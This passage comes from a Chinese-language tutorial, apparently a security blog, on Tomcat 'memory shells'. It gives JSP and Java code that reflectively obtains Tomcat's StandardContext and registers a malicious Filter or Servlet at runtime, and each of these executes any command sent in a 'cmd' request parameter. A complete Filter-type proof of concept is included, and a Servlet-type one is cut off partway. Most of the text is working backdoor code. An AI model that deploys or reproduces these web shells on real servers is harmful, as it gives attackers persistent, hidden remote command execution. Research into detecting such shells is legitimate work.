<h5 id="创建恶意Filter"><a href="#创建恶意Filter" class="headerlink" title="创建恶意Filter"></a>创建恶意Filter</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Filter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        String cmd=request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">            n.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="创建filterMap"><a href="#创建filterMap" class="headerlink" title="创建filterMap"></a>创建filterMap</h5><p>filterMap用于filter和路径的绑定</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">filterMap.setFilterName(name);</span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br></pre></td></tr></table></figure>

<h5 id="封装filterConfig及filterDef到filterConfigs"><a href="#封装filterConfig及filterDef到filterConfigs" class="headerlink" title="封装filterConfig及filterDef到filterConfigs"></a>封装filterConfig及filterDef到filterConfigs</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line">    </span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line">filterConfigs.put(name, filterConfig);</span><br></pre></td></tr></table></figure>

<h4 id="完整POC-1"><a href="#完整POC-1" class="headerlink" title="完整POC"></a>完整POC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%! <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Filter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Shell_Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Filter</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;CommonFilter&quot;</span>;</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(name);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"> </span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line">    filterConfigs.put(name, filterConfig);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>先访问jsp木马，动态注册了我们的恶意Filter，然后访问任意路由即可执行命令</p>
<h3 id="Servlet型"><a href="#Servlet型" class="headerlink" title="Servlet型"></a>Servlet型</h3><p>同样地，我们先实现一个恶意的Servlet</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Servlet;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebServlet(&quot;/shell&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Servlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                n.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面就是实现动态注册Servlet了。</p>
<h4 id="Servlet创建流程"><a href="#Servlet创建流程" class="headerlink" title="Servlet创建流程"></a>Servlet创建流程</h4><p>在<code>org.apache.catalina.core.StandardContext</code>类的<code>startInternal()</code>方法中，首先调用了<code>listenerStart()</code>，接着是<code>filterStart()</code>，最后是<code>loadOnStartup()</code>。这三处调用触发了Listener、Filter、Servlet的构造加载。</p>
<h4 id="创建StandardWrapper"><a href="#创建StandardWrapper" class="headerlink" title="创建StandardWrapper"></a>创建StandardWrapper</h4><p>在<code>StandardContext</code>#<code>startInternal</code>中，调用了<code>fireLifecycleEvent()</code>方法解析web.xml文件，我们跟进</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">fireLifecycleEvent</span><span class="params">(String type, Object data)</span> &#123;</span><br><span class="line">        <span class="type">LifecycleEvent</span> <span class="variable">event</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LifecycleEvent</span>(<span class="built_in">this</span>, type, data);</span><br><span class="line">        <span class="keyword">for</span> (LifecycleListener listener : lifecycleListeners) &#123;</span><br><span class="line">            listener.lifecycleEvent(event);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最终通过<code>ContextConfig#webConfig()</code>方法解析web.xml获取各种配置参数</p>
<p>然后通过<code>configureContext(webXml)</code>方法创建StandWrapper对象，并根据解析参数初始化StandWrapper对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">configureContext</span><span class="params">(WebXml webxml)</span> &#123;</span><br><span class="line">        <span class="comment">// As far as possible, process in alphabetical order so it is easy to</span></span><br><span class="line">        <span class="comment">// check everything is present</span></span><br><span class="line">        <span class="comment">// Some validation depends on correct public ID</span></span><br><span class="line">        context.setPublicId(webxml.getPublicId());</span><br><span class="line"> </span><br><span class="line">...   <span class="comment">//设置StandardContext参数</span></span><br><span class="line"> </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//创建StandardWrapper对象</span></span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="literal">null</span>) &#123;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">//设置LoadOnStartup属性</span></span><br><span class="line">                wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getEnabled() != <span class="literal">null</span>) &#123;</span><br><span class="line">                wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//设置ServletName属性</span></span><br><span class="line">            wrapper.setName(servlet.getServletName());</span><br><span class="line">            Map&lt;String,String&gt; params = servlet.getParameterMap();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;</span><br><span class="line">                wrapper.addInitParameter(entry.getKey(), entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">            wrapper.setRunAs(servlet.getRunAs());</span><br><span class="line">            Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();</span><br><span class="line">            <span class="keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;</span><br><span class="line">                wrapper.addSecurityReference(</span><br><span class="line">                        roleRef.getName(), roleRef.getLink());</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//设置ServletClass属性</span></span><br><span class="line">            wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">            ...</span><br><span class="line">            wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//将包装好的StandWrapper添加进ContainerBase的children属性中</span></span><br><span class="line">            context.addChild(wrapper);</span><br><span class="line"> </span><br><span class="line">           <span class="keyword">for</span> (Entry&lt;String, String&gt; entry :</span><br><span class="line">                webxml.getServletMappings().entrySet()) &#123;</span><br><span class="line">          </span><br><span class="line">            <span class="comment">//添加路径映射</span></span><br><span class="line">            context.addServletMappingDecoded(entry.getKey(), entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>最后通过<code>addServletMappingDecoded()</code>方法添加Servlet对应的url映射</p>
<h4 id="加载StandWrapper"><a href="#加载StandWrapper" class="headerlink" title="加载StandWrapper"></a>加载StandWrapper</h4><p>接着在<code>StandardContext#startInternal</code>方法通过<code>findChildren()</code>获取<code>StandardWrapper</code>类</p>
<p>最后依次加载完Listener、Filter后，就通过<code>loadOnStartUp()</code>方法加载wrapper</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">loadOnStartup</span><span class="params">(Container children[])</span> &#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Collect &quot;load on startup&quot; servlets that need to be initialized</span></span><br><span class="line">       TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">       <span class="keyword">for</span> (Container child : children) &#123;</span><br><span class="line">           <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) child;</span><br><span class="line">           <span class="type">int</span> <span class="variable">loadOnStartup</span> <span class="operator">=</span> wrapper.getLoadOnStartup();</span><br><span class="line"></span><br><span class="line">           <span class="comment">//判断属性loadOnStartup的值</span></span><br><span class="line">           <span class="keyword">if</span> (loadOnStartup &lt; <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="keyword">continue</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="type">Integer</span> <span class="variable">key</span> <span class="operator">=</span> Integer.valueOf(loadOnStartup);</span><br><span class="line">           ArrayList&lt;Wrapper&gt; list = map.get(key);</span><br><span class="line">           <span class="keyword">if</span> (list == <span class="literal">null</span>) &#123;</span><br><span class="line">               list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">               map.put(key, list);</span><br><span class="line">           &#125;</span><br><span class="line">           list.add(wrapper);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Load the collected &quot;load on startup&quot; servlets</span></span><br><span class="line">       <span class="keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;</span><br><span class="line">           <span class="keyword">for</span> (Wrapper wrapper : list) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   wrapper.load();</span><br><span class="line">               &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意这里对于Wrapper对象中<code>loadOnStartup</code>属性的值进行判断，只有大于0的才会被放入list进行后续的<code>wrapper.load()</code>加载调用。</p>
<p>这里对应的实际上就是Tomcat Servlet的懒加载机制，可以通过<code>loadOnStartup</code>属性值来设置每个Servlet的启动顺序。默认值为-1，此时只有当Servlet被调用时才加载到内存中。</p>
<h4 id="动态注册Servlet"><a href="#动态注册Servlet" class="headerlink" title="动态注册Servlet"></a>动态注册Servlet</h4><p>通过上文的分析我们能够总结出创建Servlet的流程</p>
<ol>
<li>获取<code>StandardContext</code>对象</li>
<li>编写恶意Servlet</li>
<li>通过<code>StandardContext.createWrapper()</code>创建<code>StandardWrapper</code>对象</li>
<li>设置<code>StandardWrapper</code>对象的<code>loadOnStartup</code>属性值</li>
<li>设置<code>StandardWrapper</code>对象的<code>ServletName</code>属性值</li>
<li>设置<code>StandardWrapper</code>对象的<code>ServletClass</code>属性值</li>
<li>将<code>StandardWrapper</code>对象添加进<code>StandardContext</code>对象的<code>children</code>属性中</li>
<li>通过<code>StandardContext.addServletMappingDecoded()</code>添加对应的路径映射</li>
</ol>
<h4 id="获取StandardContext对象-1"><a href="#获取StandardContext对象-1" class="headerlink" title="获取StandardContext对象"></a>获取StandardContext对象</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h4 id="编写恶意Servlet"><a href="#编写恶意Servlet" class="headerlink" title="编写恶意Servlet"></a>编写恶意Servlet</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Servlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h4 id="创建Wrapper对象"><a href="#创建Wrapper对象" class="headerlink" title="创建Wrapper对象"></a>创建Wrapper对象</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Shell_Servlet</span> <span class="variable">shell_servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Servlet</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> shell_servlet.getClass().getSimpleName();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    wrapper.setName(name);</span><br><span class="line">    wrapper.setServlet(shell_servlet);</span><br><span class="line">    wrapper.setServletClass(shell_servlet.getClass().getName());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h4 id="将Wrapper添加进StandardContext"><a href="#将Wrapper添加进StandardContext" class="headerlink" title="将Wrapper添加进StandardContext"></a>将Wrapper添加进StandardContext</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    standardContext.addChild(<span class="keyword">wrapper</span>);</span><br><span class="line">    standardContext.addServletMappingDecoded(&quot;/shell&quot;,<span class="type">name</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h4 id="完整POC-2"><a href="#完整POC-2" class="headerlink" title="完整POC"></a>完整POC</h4><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Servlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Shell_Servlet</span> <span class="variable">shell_servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Servlet</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> shell_servlet.getClass().getSimpleName();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    wrapper.setName(name);</span><br><span class="line">  